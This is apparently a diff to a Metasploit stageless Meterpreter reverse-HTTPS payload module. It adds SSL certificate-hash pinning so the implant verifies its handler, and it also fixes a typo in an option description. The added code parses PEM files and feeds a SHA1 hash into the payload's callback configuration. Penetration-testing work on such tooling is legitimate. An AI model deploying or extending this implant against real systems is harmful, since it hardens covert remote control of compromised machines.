@@ -8,6 +8,8 @@ require 'msf/core/handler/reverse_https'
 require 'msf/core/payload/windows/stageless_meterpreter'
 require 'msf/base/sessions/meterpreter_x86_win'
 require 'msf/base/sessions/meterpreter_options'
+# TODO: put this in when HD's PR has been landed.
+#require 'rex/parser/x509_certificate'
 
 module Metasploit3
 
@@ -30,7 +32,7 @@ module Metasploit3
       ))
 
     register_options([
-      OptString.new('EXTENSIONS', [false, "Comma-separate list of extensions to load"]),
+      OptString.new('EXTENSIONS', [false, "Comma-separated list of extensions to load"]),
     ], self.class)
   end
 
@@ -57,6 +59,7 @@ module Metasploit3
       Rex::Payloads::Meterpreter::Patch.patch_passive_service! dll,
         :url            => url,
         :ssl            => true,
+        :ssl_cert_hash  => get_ssl_cert_hash,
         :expiration     => datastore['SessionExpirationTimeout'].to_i,
         :comm_timeout   => datastore['SessionCommunicationTimeout'].to_i,
         :ua             => datastore['MeterpreterUserAgent'],
@@ -66,6 +69,58 @@ module Metasploit3
         :proxy_username => datastore['PROXY_USERNAME'],
         :proxy_password => datastore['PROXY_PASSWORD']
     end
+
+  end
+
+  # TODO: remove all that is below this when HD's PR has been landed
+  def get_ssl_cert_hash
+    unless datastore['StagerVerifySSLCert'].to_s =~ /^(t|y|1)/i
+      return nil
+    end
+
+    unless datastore['HandlerSSLCert']
+      raise ArgumentError, "StagerVerifySSLCert is enabled but no HandlerSSLCert is configured"
+    end
+
+    # TODO: fix this up when HD's PR has landed.
+    #hcert = Rex::Parser::X509Certificate.parse_pem_file(datastore['HandlerSSLCert'])
+    hcert = parse_pem_file(datastore['HandlerSSLCert'])
+    unless hcert and hcert[0] and hcert[1]
+      raise ArgumentError, "Could not parse a private key and certificate from #{datastore['HandlerSSLCert']}"
+    end
+
+    hash = Rex::Text.sha1_raw(hcert[1].to_der)
+    print_status("Meterpreter will verify SSL Certificate with SHA1 hash #{hash.unpack("H*").first}")
+    hash
+  end
+
+  def parse_pem(ssl_cert)
+    cert  = nil
+    key   = nil
+    chain = nil
+
+    certs = []
+    ssl_cert.scan(/-----BEGIN\s*[^\-]+-----+\r?\n[^\-]*-----END\s*[^\-]+-----\r?\n?/nm).each do |pem|
+      if pem =~ /PRIVATE KEY/
+        key = OpenSSL::PKey::RSA.new(pem)
+      elsif pem =~ /CERTIFICATE/
+        certs << OpenSSL::X509::Certificate.new(pem)
+      end
+    end
+
+    cert = certs.shift
+    if certs.length > 0
+      chain = certs
+    end
+
+    [key, cert, chain]
+  end
+  def parse_pem_file(ssl_cert_file)
+    data = ''
+    ::File.open(ssl_cert_file, 'rb') do |fd|
+      data << fd.read(fd.stat.size)
+    end
+    parse_pem(data)
   end
 
 end
